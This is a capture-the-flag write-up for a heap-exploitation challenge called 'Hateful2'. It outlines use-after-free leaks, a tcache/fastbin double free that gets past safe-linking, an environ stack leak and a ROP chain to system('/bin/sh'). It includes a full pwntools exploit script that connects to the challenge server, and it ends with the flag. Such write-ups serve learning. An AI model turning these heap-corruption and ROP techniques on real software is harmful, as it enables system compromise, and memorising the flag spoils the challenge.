# Hateful2
![image](https://github.com/user-attachments/assets/a9d16dd8-9f5e-440d-b3ba-a012ea4f0207)

## Description
### main
![image](https://github.com/user-attachments/assets/2fcacfac-3ebd-4e48-9065-fc18d0c1ad2b)

### Functionality
![image](https://github.com/user-attachments/assets/624a4dac-0206-41c5-a241-177dd85365a4)
![image](https://github.com/user-attachments/assets/e9b56296-939e-401f-8050-29beaef8e21a)
![image](https://github.com/user-attachments/assets/e25336dc-5a47-48dc-80ec-7aa1b2f4a0c0)
![image](https://github.com/user-attachments/assets/cbbaa640-333b-4eca-b2dd-d51c5e900bc5)

## Solution
### Step 1: Leak Heap Address
Do **Use After Free** to leak heap address. We will need it for mangling/demangling next address.
### Step 2: Leak LIBC Address
Do **Use After Free** on freed chunk from unsorted bin which contains heap address in *fd* field.
### Step 3: Leak Stack Address
Do **Double Free** by filling tcache and then free-ing chunks into fastbin. 
We can overwrite next address of freed chunk and allocate chunk at memory address we want.
Allocate memory in libc to read *environ*, which stores stack address.
### Step 4: Leak Binary Address
Find binary address on the stack and leak it like step 3.
### Step 5: ROP
We have all the addresses. Now do ROP to gain shell.

## Script
```py
from pwn import *

context.binary = exe = ELF("./hateful2")
context.log_level = "error"
libc = ELF("./libc.so.6")

p = process(["nc", "52.59.124.14", "5022"], timeout=5)


def do_ROP(libc_base):
    libc.address = libc_base
    rop = ROP(libc)
    rop.raw(rop.find_gadget(['ret']))
    rop.system(next(libc.search(b'/bin/sh')))

    print(len(rop.chain()))
    return rop

def demangle(address):
    return address ^ (address>>12) ^ (address>>24) ^ (address>>36)


def malloc(i, size, payload):
    p.sendline(f"1 {i} {size} ".encode() + payload)
    sleep(0.1)
    return p.recvuntil(b"\n\n")

def edit(i, payload):
    p.sendline(f"2 {i} ".encode()+payload)
    return p.recvuntil(b"\n\n")

def view(i):
    p.sendline(f"3 {i}".encode())
    return p.recvuntil(b"\n\n")

def remove(i):
    p.sendline(f"4 {i}".encode())
    return p.recvuntil(b"\n\n")


def extract(a):
    return u64(a[-8:-2].ljust(8, b'\00'))

def heap_leak():
    for i in range(2):
        res = remove(i)
    return extract(view(1))

def leak_libc():
    malloc(15, 4000, b"gio")
    malloc(14, 10, b"fx")
    remove(15)

    return extract(view(15))




p.recvuntil(b"0.")

sz = 96
for i in range(16):
    res = malloc(i, sz, b"gio")

offset_str = heap_leak()
self_xor_correct = demangle(offset_str)
heap_page_offset = self_xor_correct & 0xfffffffffffff000
print(hex(heap_page_offset))


libc_base_offset = 0x1d2cc0
leak = leak_libc()
libc_base = leak-libc_base_offset
print(hex(libc_base))

environ_offset = 0x00000000001da320

target = libc_base + environ_offset - 0x10

# exit(0)

for i in range(2, 7):
    res = remove(i)

remove(9)
remove(7)
remove(8)
remove(7)

for i in range(7):
    malloc(0, sz, b"gio")

for i in range(3):
    malloc(i, sz, b"gio")

remove(1)
remove(0)

edit(2, p64(target ^ (heap_page_offset >> 12)))

malloc(1, sz, b"gio")
malloc(0, sz, b"a"*15)

stack_leak = view(0)[-8:-2].ljust(8, b'\00')
stack_leak = u64(stack_leak)


remove(4)
remove(1)

print(hex(stack_leak))

offset = 0x2a8
offset = -0x8 - 0x140 + 0x30 + 0x30
target = stack_leak + offset - 0x10

edit(2, p64(target ^ (heap_page_offset >> 12)))

malloc(1, sz, b"gio")
malloc(0, sz, b"a"*(23+8))
# edit(0, b'a'*7)


leak = extract(view(0))
print(hex(leak))
# p.interactive()
# exit(0)

bin_base = leak - 0x3d78
print(hex(bin_base))

offset = 0x4060

remove(5)
remove(1)

offset = -0x8 - 0x140
target = stack_leak + offset
print(hex(target))
edit(2, p64(target ^ (heap_page_offset >> 12)))


rop = do_ROP(libc_base)


malloc(1, sz, b"gio")
malloc(0, sz, p64(stack_leak-0x140-0x8+0x20) + rop.chain())
# print(view(0))


p.interactive()

p.close()
```

## FLAG
ENO{W3_4R3_50RRY_4G41N_TH4T_TH3_M3554G3_W45_N0T_53NT_T0_TH3_R1GHT_3M41L}

